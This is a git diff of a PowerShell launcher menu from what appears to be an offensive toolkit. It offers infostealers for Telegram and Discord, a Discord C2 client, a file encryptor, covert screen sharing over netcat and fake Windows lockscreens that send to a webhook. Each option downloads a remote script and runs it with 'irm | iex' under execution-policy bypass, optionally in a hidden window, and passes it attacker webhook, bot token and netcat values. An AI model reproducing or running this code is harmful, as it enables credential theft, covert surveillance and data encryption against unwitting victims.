@@ -6,7 +6,7 @@ All useful tools in one place.
 A selection of Powershell tools from this repo can be ran from this script.
 
 USAGE
-1. Replace the URLS and TOKENS below.
+1. Replace the URLS and TOKENS below. (they can also be added by running the script)
 2. Run the script and follow options in the console
 
 INFO
@@ -15,10 +15,11 @@ Any background/hidden scripts eg. C2 clients will keep running.
 
 #>
 
-$hookurl = "DISCORD_WEBHOOK_HERE"
-$ghurl = "PASTEBIN_URL_HERE"
-$tg = "TELEGRAM_BOT_TOKEN"
-$NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
+# Uncomment below (or def)
+#$hookurl = "DISCORD_WEBHOOK_HERE"
+#$ghurl = "PASTEBIN_URL_HERE"
+#$tg = "TELEGRAM_BOT_TOKEN"
+#$NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
 
 $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
@@ -36,7 +37,7 @@ $Header = "=====================================================================
 =    |______  /\___  >__\___  / \___  >____| \____/ \____/|____/____  >      =
 =           \/     \/  /_____/      \/                              \/       =
 ==============================================================================`n"
-Write-Host "$header"
+Write-Host "$header" -ForegroundColor Green
 }
 
 $list = "==============================================================================
@@ -57,15 +58,31 @@ $list = "=======================================================================
 = 9.  Network Enumeration                  22. Windows 10 Lockscreen         =
 = 10. Microphone Muter                     23. Windows 11 Lockscreen         =
 = 11. Webhook Spammer                                                        =
-= 12. Social Search                        Exit                              =
+= 12. Social Search                        00. Token and URL setup           =
 = 13. GDI effects                          99. Close Program                 =
 =                                                                            =
 ==============================================================================
-Choose an option "
+"
+
+Function EnterTokens{
+    if (($hookurl.Length -eq 0) -or ($ghurl.Length -eq 0) -or ($tg.Length -eq 0) -or ($NCurl.Length -eq 0)){Write-Host "Missing Entries Found." -ForegroundColor Red;sleep 1;cls;Header;Write-Host "Please enter the missing URLs and API Tokens" -ForegroundColor Yellow;Write-Host "You can leave these empty however functionality will be limited..`n" -ForegroundColor DarkGray;sleep 1}
+    if ($hookurl.Length -eq 0){$hookurl = Read-Host "Enter a Discord Webhook ";Write-Host "Webhook Set." -ForegroundColor Green}
+    if ($ghurl.Length -eq 0){$ghurl = Read-Host "Enter a RAW Pastebin URL ";Write-Host "Pastebin URL Set." -ForegroundColor Green}
+    if ($tg.Length -eq 0){$tg = Read-Host "Enter a Telegram Bot API Token ";Write-Host "API Token." -ForegroundColor Green}
+    if ($NCurl.Length -eq 0){$NCurl = Read-Host "Enter an IPv4 address for Netcat";Write-Host "IPv4 address Set." -ForegroundColor Green}
+}
+
+Header
+sleep 1
+Write-Host "Checking URLs and API Tokens" -ForegroundColor Yellow
+sleep 1
+EnterTokens
 
 While ($Option -ne '99'){
-header
-$Option = Read-Host "$list"
+cls
+Header
+Write-Host "$list" -ForegroundColor Green
+$Option = Read-Host "Choose an option "
 $BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
 $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
 
@@ -73,10 +90,8 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
     if ($Option -eq '2'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
     if ($Option -eq '3'){$url = "$BaseURL/NC-Func.ps1"}
     if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
-
     if ($Option -eq '5'){$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
     if ($Option -eq '6'){$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
-    
     if ($Option -eq '7'){$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
     if ($Option -eq '8'){$url = "$BaseURL/Record-Screen-GUI.ps1"}
     if ($Option -eq '9'){$url = "$BaseURL/Network-Enumeration-GUI.ps1"}
@@ -84,36 +99,28 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
     if ($Option -eq '11'){$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
     if ($Option -eq '12'){$url = "$BaseURL/Social-Search-GUI.ps1"}
     if ($Option -eq '13'){$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
-    
     if ($Option -eq '14'){$url = "$BaseURL/Telegram-InfoStealer.ps1"}
     if ($Option -eq '15'){$url = "$BaseURL/Discord-Infostealer.ps1"}
     if ($Option -eq '16'){$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
-    
     if ($Option -eq '17'){$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
     if ($Option -eq '18'){$url = "$BaseURL/Console-Task-Manager.ps1"}
     if ($Option -eq '19'){$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
     if ($Option -eq '20'){$url = "$BaseURL/Image-to-Console.ps1"}
     if ($Option -eq '21'){$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
-    
     if ($Option -eq '22'){$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
     if ($Option -eq '23'){$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
-
     if ($Option -eq '99'){Write-Host "Closing Script";sleep 1; break}
     else{Write-Host "No valid option selected."}
 
-
     while ($Option -ne '99'){
         Header
-
             if (($Option -eq '5') -or ($Option -eq '6')){
                 Header
                 $danger = Read-Host "THIS IS A DANGEROUS SCRIPT - ARE YOU SURE? (Y/N)" =
             if ($danger -eq 'n'){
                 break
             }
-
         }
-
         $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
         if (($Option -eq '14') -or ($Option -eq '15') -or ($Option -eq '16') -or ($Option -eq '22') -or ($Option -eq '23')){
             $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
@@ -126,7 +133,7 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
                 break
             }
             else{
-                Write-Host "No valid option selected"
+                Write-Host "No valid option selected" -ForegroundColor Red
                 break  
             }
         }
@@ -138,11 +145,11 @@ $PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$stage = 'y'; irm $url | iex")
             break
         }
+        if ($Option -eq '00'){Write-Host "Entering Token and URL setup.." -ForegroundColor Yellow;sleep 1;EnterTokens;break}
         else{
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
     }
-
 sleep 1
 }
